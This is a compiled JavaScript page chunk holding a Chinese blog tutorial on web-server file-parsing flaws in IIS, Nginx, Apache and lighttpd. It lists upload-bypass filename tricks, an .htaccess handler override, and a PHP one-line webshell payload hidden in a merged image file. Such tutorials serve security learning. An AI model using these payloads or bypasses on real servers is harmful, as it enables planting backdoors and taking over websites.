(window.webpackJsonp=window.webpackJsonp||[]).push([[237],{528:function(p,a,t){"use strict";t.r(a);var v=t(7),_=Object(v.a)({},(function(){var p=this,a=p._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":p.$parent.slotKey}},[a("h1",{attrs:{id:"iis-6-0-7-0-7-5、nginx、apache-等-web-service-解析漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#iis-6-0-7-0-7-5、nginx、apache-等-web-service-解析漏洞"}},[p._v("#")]),p._v(" IIS 6.0/7.0/7.5、Nginx、Apache 等 Web Service 解析漏洞")]),p._v(" "),a("h2",{attrs:{id:"iis-6-0"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#iis-6-0"}},[p._v("#")]),p._v(" [+]IIS 6.0")]),p._v(" "),a("p",[p._v("目录解析：/xx.asp/xx.jpg xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码")]),p._v(" "),a("p",[p._v("IIS6.0 会将 xx.jpg 解析为 asp 文件。")]),p._v(" "),a("p",[p._v("后缀解析：/xx.asp;.jpg   /xx.asp:.jpg(此处需抓包修改文件名)")]),p._v(" "),a("p",[p._v("IIS6.0 都会把此类后缀文件成功解析为 asp 文件。")]),p._v(" "),a("p",[p._v("（站长评论：IIS6.0解析漏洞的成因，可以查阅罗哥写的一篇短文："),a("a",{attrs:{href:"http://lcx.cc/?i=1958",target:"_blank",rel:"noopener noreferrer"}},[p._v("IIS 文件名解析漏洞扼要分析"),a("OutboundLink")],1),p._v("）")]),p._v(" "),a("p",[p._v("{/xx.asp:.jpg 此类文件在Windows下不允许存在，:.jpg被自动除去，剩下/xx.asp}")]),p._v(" "),a("p",[p._v("（站长评论：发现错误，并不是不允许存在，这种路径叫做“NTFS数据流”，具体见："),a("a",{attrs:{href:"http://lcx.cc/?i=2448",target:"_blank",rel:"noopener noreferrer"}},[p._v("IIS6使用冒号上传漏洞，发现IIS6漏洞(上传利用)"),a("OutboundLink")],1),p._v(" 底下的评论）")]),p._v(" "),a("p",[p._v("默认解析：/xx.asa  /xx.cer  /xx.cdx")]),p._v(" "),a("p",[p._v("IIS6.0 默认的可执行文件除了 asp 还包含这三种")]),p._v(" "),a("p",[p._v("（站长评论：这种主要是由于在 IIS 默认配置中，这几个后缀默认由 asp.dll 来解析，所以执行权限和 .asp 一摸一样，你可在配置中自行删除该后缀，以防止安全隐患）")]),p._v(" "),a("p",[p._v("此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg")]),p._v(" "),a("h2",{attrs:{id:"iis-7-0-iis-7-5-nginx-0-8-37"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#iis-7-0-iis-7-5-nginx-0-8-37"}},[p._v("#")]),p._v(" [+]IIS 7.0/IIS 7.5/Nginx <=0.8.37")]),p._v(" "),a("p",[p._v("IIS 7.0/IIS 7.5/Nginx <=0.8.37")]),p._v(" "),a("p",[p._v("在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。")]),p._v(" "),a("p",[p._v("常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾")]),p._v(" "),a("p",[p._v("e.g. copy xx.jpg/b + yy.txt/a xy.jpg")]),p._v(" "),a("p",[p._v("###################")]),p._v(" "),a("p",[p._v("/b 即二进制[binary]模式")]),p._v(" "),a("p",[p._v("/a 即ascii模式 xx.jpg正常图片文件")]),p._v(" "),a("p",[p._v("yy.txt 内容 <?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>")]),p._v(" "),a("p",[p._v("意思为写入一个内容为 <?php eval($_POST[cmd])?> 名称为shell.php的文件")]),p._v(" "),a("p",[p._v("###################")]),p._v(" "),a("p",[p._v("找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。")]),p._v(" "),a("p",[p._v("然后就在图片目录下生成一句话木马 shell.php 密码 cmd")]),p._v(" "),a("h2",{attrs:{id:"nginx-0-8-37"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#nginx-0-8-37"}},[p._v("#")]),p._v(" [+]Nginx <=0.8.37")]),p._v(" "),a("p",[p._v("在Fast-CGI关闭的情况下，Nginx <=0.8.37 依然存在解析漏洞")]),p._v(" "),a("p",[p._v("在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。")]),p._v(" "),a("p",[p._v("（站长评论：从 /test.jpg/x.php 演变过来的，具体可以参考："),a("a",{attrs:{href:"http://lcx.cc/?i=1716",target:"_blank",rel:"noopener noreferrer"}},[p._v("Ngnix 空字节可远程执行代码漏洞"),a("OutboundLink")],1),p._v("）")]),p._v(" "),a("h2",{attrs:{id:"apache"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#apache"}},[p._v("#")]),p._v(" [+]Apache")]),p._v(" "),a("p",[p._v("后缀解析：test.php.x1.x2.x3")]),p._v(" "),a("p",[p._v("Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析")]),p._v(" "),a("p",[p._v("test.php.x1.x2.x3 则会被解析为php")]),p._v(" "),a("p",[p._v("经验之谈：php|php3|phtml 多可被Apache解析")]),p._v(" "),a("p",[p._v("（站长评论：关于 apache 解析漏洞可以查阅“"),a("a",{attrs:{href:"http://lcx.cc/?i=337",target:"_blank",rel:"noopener noreferrer"}},[p._v("Apache 漏洞之后缀名解析漏洞"),a("OutboundLink")],1),p._v("”）")]),p._v(" "),a("h2",{attrs:{id:"其他一些可利用的"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#其他一些可利用的"}},[p._v("#")]),p._v(" [+]其他一些可利用的")]),p._v(" "),a("p",[p._v("在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，这也是可以被利用的！")]),p._v(" "),a("p",[p._v("在向一台windows主机上传数据时，你可以抓包修改文件名，在后面加个空格或点，试图绕过黑名单，若上传成功，最后的点或空格都会被消除，这样就可得到shell。")]),p._v(" "),a("p",[p._v("我记得Fck Php 2.6就存在加空格绕过的漏洞。{Linux主机中不行，Linux允许这类文件存在}")]),p._v(" "),a("p",[p._v("如果在Apache中.htaccess可被应用（Apache的配置文件httpd.conf中对目录的AllowOverride设置为All时，apache会应用目录下.htaccess中的配置 By sfasfas），")]),p._v(" "),a("p",[p._v("且可以被上传，那可以尝试在.htaccess中写入:")]),p._v(" "),a("FilesMatch",{attrs:{"“shell.jpg”":""}},[p._v(" SetHandler application/x-httpd-php ")]),p._v(" "),a("p",[p._v("shell.jpg换成你上传的文件，这样shell.jpg就可解析为php文件")]),p._v(" "),a("h2",{attrs:{id:"lighttpd"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#lighttpd"}},[p._v("#")]),p._v(" [+]lighttpd")]),p._v(" "),a("p",[p._v("xx.jpg/xx.php")]),p._v(" "),a("p",[p._v("[Add by El4pse]")]),p._v(" "),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[p._v("#")]),p._v(" 写在最后")]),p._v(" "),a("blockquote",[a("p",[p._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[p._v("冰河技术")]),p._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[p._v("冰河技术")]),p._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[p._v("冰河技术")]),p._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[p._v("冰河技术")]),p._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),p._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])],1)}),[],!1,null,null,null);a.default=_.exports}}]);